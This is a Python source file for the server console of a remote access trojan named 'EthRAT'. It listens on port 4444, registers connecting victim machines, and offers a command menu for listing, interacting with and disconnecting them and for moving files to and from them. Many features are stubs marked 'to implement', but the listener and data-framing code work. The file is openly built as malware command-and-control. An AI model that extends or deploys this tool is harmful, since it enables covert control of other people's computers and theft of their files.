import socket
import threading
import os
import ctypes
import queue
from datetime import datetime
import struct

# Colors
cyan = "\033[1;36m"
red = "\033[1;31m"
green = "\033[38;5;82m"
yellow = "\033[1;33m"
white = "\033[39m"
reset = "\033[0m"
blue = "\033[1;34m"
purple = "\033[1;35m"

clients = {}
server_active = True

LHOST = "0.0.0.0"
LPORT = 4444

logo = red + r"""
##################################
 _____ _   _    ______  ___ _____ 
|  ___| | | |   | ___ \/ _ \_   _|
| |__ | |_| |__ | |_/ / /_\ \| |  
|  __|| __| '_ \|    /|  _  || |  
| |___| |_| | | | |\ \| | | || |  
\____/ \__|_| |_\_| \_\_| |_/\_/  

##################################
""" + reset + "\n\n"


def help():
    """ Help Menu """
    print(green + """
    |--------------------| -----------------------------------------|
    |      Commands      |                Description               |
    |--------------------| -----------------------------------------|
    |       help         | Display help menu                        |
    |       list         | List the connected clients               |
    |       0            | Broadcast to all clients                 |
    |       <clientId>   | Interract with client                    |
    |       kill         | Kill connection with client              |
    |       exit         | Stop the server                          |
    |       download     | Download file/directory from client      |
    |       upload       | Upload file/directory to client          |
    |       cd           | Browse to a directory                    |
    |       getip        | Get the clients public IP                |
    |--------------------| -----------------------------------------|
    """ + reset)

def window_title(clients):
        if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")

def list_clients(clients):
    for index, (addr, socket) in enumerate(clients.items()):
        print(f"{purple}{index + 1}{reset}. {green}{addr[0]}:{addr[1]}{reset}")

def get_client_by_index(clients, choice):
    client_list = list(clients.items()) 
    if 1 <= choice <= len(client_list):
        addr, client_socket = client_list[choice - 1]  
        return client_socket, addr  
    else:
        print(f"{red}Invalid choice. Type 'list' for the connected clients{reset}")
        return None, None



def handle_client(socket):
        while server_active:
            try:
                client_socket, addr = socket.accept()
                clients[addr] = client_socket
                print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}")
                window_title(clients)

                threading.Thread(target=handle_client_commands, args=(client_socket, addr), daemon=True).start()

            except (ConnectionResetError, OSError) as e:
                 print(f"{red}[-]{reset} Client error: {e}")
                 if addr in clients:
                    del clients[addr]
                    window_title(clients)

def handle_client_commands(client_socket, addr):
    try:
        while server_active:
            command = client_socket.recv(1024).decode()
            if not command:
                 break
    except (ConnectionResetError, ConnectionAbortedError):
        print(f"{red}[-]{reset} Client {addr[0]} disconnected\n")
        client_socket.close()
        if addr in clients:
            del clients[addr]
            window_title(clients)

def send(sock, data):
    """ Bulk Send Commands And Data """
    try:
        sock.sendall(struct.pack('>I', len(data)) + data)
    except (ConnectionError, struct.error, OSError) as e:
        print(f"{red}Send failed: {e}{reset}")

def recv(sock):
    """ Receive First Letter, Then Return the rest """
    try:
        data_size = recvall(sock, 4)
        if not data_size:
            return b''
        data_len = struct.unpack('>I', data_size)[0]
        return recvall(sock, data_len)
    except (ConnectionError, struct.error, OSError) as e:
        print(f"{red}Receive failed: {e}{reset}")

def recvall(sock, n):
    """ Bulk Receive Data, Including Files and Whatnot """
    try:
        packet = b''
        while len(packet) < n:
          chunk = sock.recv(n - len(packet))
          if not chunk:
            return None
          packet += chunk
        return packet
    except (ConnectionError, struct.error, OSError) as e:
        print(f"{red}Receive all failed: {e}{reset}")

def download():
    pass

def save_file():
    pass

def upload():
    pass

def send_file():
    pass

def start_server(lhost, lport):
    global server_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, lport))
        sock.listen(5)
        
        os.system("cls" if os.name == "nt" else "clear")
        print(logo)
        print(yellow + "[*] Server Started On {}:{} < at [{}]".format(lhost, lport, datetime.now().strftime("%H:%M:%S")) + reset)
        threading.Thread(target=handle_client, args=(sock,), daemon=True).start()

        while server_active:
            if clients: 
                try:
                    cmd = input(f"\n{cyan}Main>{reset} ").strip().lower()
                    
                    if cmd == "help":
                        help()

                    elif cmd == "list":
                        list_clients(clients)  

                    elif cmd == "0":
                        print(f"{yellow}[*]{reset} Broadcast mode (to implement)")    
                        
                    elif cmd.isdigit():
                        client_socket, addr = get_client_by_index(clients, int(cmd))
                        if client_socket:
                            ip, port = addr
                            print(f"{yellow}[*]{reset} Interracting with {ip}:{port}> (to implement interaction)")
                      
                    elif cmd == "exit":
                        print(f"{yellow}[*]{reset} Shutting down the server...")
                        server_active = False
                        
                    else:
                        print(f"{red}[-]{reset} Unknown command. Type 'help'")
                        
                except (OSError, EOFError, ValueError) as e:
                    print(f"\n{red}[!]{reset} Error: {e}{reset}")
                    continue

    except (KeyboardInterrupt, EOFError):
        print("\nShutting down server...")
        server_active = False
    except (socket.error, OSError) as e:
        print(f"{red}Error: {e}{reset}")
        server_active = False
    finally:
        server_active = False
        sock.close()


if __name__ == "__main__":
    start_server(LHOST, LPORT)